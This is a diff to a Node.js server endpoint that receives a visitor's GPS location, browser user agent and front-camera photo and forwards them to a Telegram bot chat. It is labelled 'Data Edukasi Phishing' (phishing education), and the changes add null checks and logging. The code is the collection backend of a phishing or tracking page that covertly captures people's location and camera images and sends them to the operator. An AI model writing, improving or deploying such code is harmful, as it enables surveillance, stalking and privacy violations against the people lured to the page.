@@ -49,26 +49,44 @@ app.post('/send-data', async (req, res) => {
   try {
     const { chatId, token, location, photo, userAgent } = req.body;
     
-    console.log('Data received:', { chatId, token, location: !!location, photo: !!photo, userAgent });
+    console.log('Data received:', { 
+      chatId, 
+      hasToken: !!token, 
+      hasLocation: !!location, 
+      hasPhoto: !!photo, 
+      userAgent: userAgent ? userAgent.substring(0, 50) + '...' : 'none' 
+    });
     
     const expectedToken = generateToken(chatId);
     if (token !== expectedToken) {
+      console.log('Invalid token received');
       return res.status(403).json({ success: false, message: 'Invalid token' });
     }
 
-    let message = `📱 Data Edukasi Phishing\n` +
-                 `📍 Lokasi: ${location.latitude}, ${location.longitude}\n` +
-                 `🌐 Browser: ${userAgent}\n` +
-                 `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;
+    // Send location
+    if (location && location.latitude && location.longitude) {
+      await bot.sendLocation(chatId, location.latitude, location.longitude);
+    }
     
-    await bot.sendLocation(chatId, location.latitude, location.longitude);
+    // Prepare message
+    let message = `📱 Data Edukasi Phishing\n`;
+    if (location && location.latitude && location.longitude) {
+      message += `📍 Lokasi: ${location.latitude}, ${location.longitude}\n`;
+    } else {
+      message += `📍 Lokasi: Tidak berhasil diperoleh\n`;
+    }
+    message += `🌐 Browser: ${userAgent || 'Tidak diketahui'}\n`;
+    message += `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;
+    
     await bot.sendMessage(chatId, message);
     
+    // Send photo if available
     if (photo) {
       try {
         const base64Data = photo.replace(/^data:image\/jpeg;base64,/, "");
         const buffer = Buffer.from(base64Data, 'base64');
-        await bot.sendPhoto(chatId, buffer, {caption: 'Foto dari kamera pengguna'});
+        await bot.sendPhoto(chatId, buffer, {caption: 'Foto dari kamera depan pengguna'});
+        console.log('Photo sent successfully');
       } catch (photoError) {
         console.error('Error sending photo:', photoError);
         await bot.sendMessage(chatId, '⚠️ Gagal mengirim foto');
